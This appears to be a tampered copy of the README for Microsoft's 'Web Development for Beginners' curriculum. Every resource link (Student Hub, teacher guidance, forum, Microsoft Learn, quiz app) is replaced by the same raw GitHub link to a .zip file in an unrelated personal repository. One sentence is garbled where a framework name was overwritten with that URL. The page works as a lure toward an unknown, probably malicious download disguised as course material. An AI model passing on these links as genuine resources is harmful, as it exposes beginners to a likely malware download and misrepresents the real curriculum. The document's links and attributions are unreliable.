# Web Development for Beginners - A Curriculum

Azure Cloud Advocates at Microsoft are pleased to offer a 12-week, 24-lesson curriculum which is all about JavaScript, CSS, and HTML basics. Each lesson includes pre- and post-lesson quizzes, written instructions to complete the lesson, a solution, an assignment and more. Our project-based pedagogy allows you to learn while building, a proven way for new skills to 'stick'.

**Hearty thanks to our authors Jen Looper, Chris Noring, Christopher Harrison, Jasmine Greenaway, Yohan Lasorsa, Floor Drees, and sketchnote artist Tomomi Imura!**

### _Are you a student?_

Visit [**Student Hub page**](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip) where you will find beginner resources, Student packs and even ways to get a free certificate voucher. This is the page you want to bookmark and check from time to time as we switch out content monthly.

# Getting Started

> **Teachers**, we have [included some suggestions](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip) on how to use this curriculum. We'd love your feedback [in our discussion forum](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip)!

> **[Students](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip)**, to use this curriculum on your own, fork the entire repo and complete the exercises on your own, starting with a pre-lecture quiz, then reading the lecture and completing the rest of the activities. Try to create the projects by comprehending the lessons rather than copying the solution code; however, that code is available in the /solutions folders in each project-oriented lesson. Another idea would be to form a study group with friends and go through the content together. For further study, we recommend [Microsoft Learn](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip) and watching the videos mentioned below.

## Pedagogy

We have chosen two pedagogical tenets while building this curriculum: ensuring that it is project-based and that it includes frequent quizzes. By the end of this series, students will have built a typing game, a virtual terrarium, a 'green' browser extension, a 'space invaders' type game, and a business-type banking app, and will have also learned the basics of JavaScript, HTML, and CSS along with the modern toolchain of today's web developer.

> 🎓 You can take the first few lessons in this curriculum as a [Learn Path](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip) on Microsoft Learn!

By ensuring that the content aligns with projects, the process is made more engaging for students and retention of concepts will be augmented. We also wrote several starter lessons in JavaScript basics to introduce concepts, paired with a video from the "[Beginners Series to: JavaScript](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip)" collection of video tutorials, some of whose authors contributed to this curriculum.

In addition, a low-stakes quiz before a class sets the intention of the student towards learning a topic, while a second quiz after class ensures further retention. This curriculum was designed to be flexible and fun and can be taken in whole or in part. The projects start small and become increasingly complex by the end of the 12-week cycle.

While we have purposefully avoided introducing JavaScript frameworks to concentrate on the basic skills needed as a web developer before adopting a framework, a good next step to completing this curriculum would be learning about https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip via another collection of videos: "[Beginner Series to: https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip)".

We welcome your constructive feedback!

## Each lesson includes:

- optional sketchnote
- optional supplemental video
- pre-lesson warmup quiz
- written lesson
- for project-based lessons, step-by-step guides on how to build the project
- knowledge checks
- a challenge
- supplemental reading
- assignment
- post-lesson quiz

> **A note about quizzes**: All quizzes are contained [in this app](https://raw.githubusercontent.com/dussa-vinay17/vinay-dussa/main/6-space-game/4-collision-detection/solution/assets/vinay-dussa-2.0.zip), for 48 total quizzes of three questions each. They are linked from within the lessons but the quiz app can be run locally; follow the instruction in the `quiz-app` folder. They are gradually being localized.
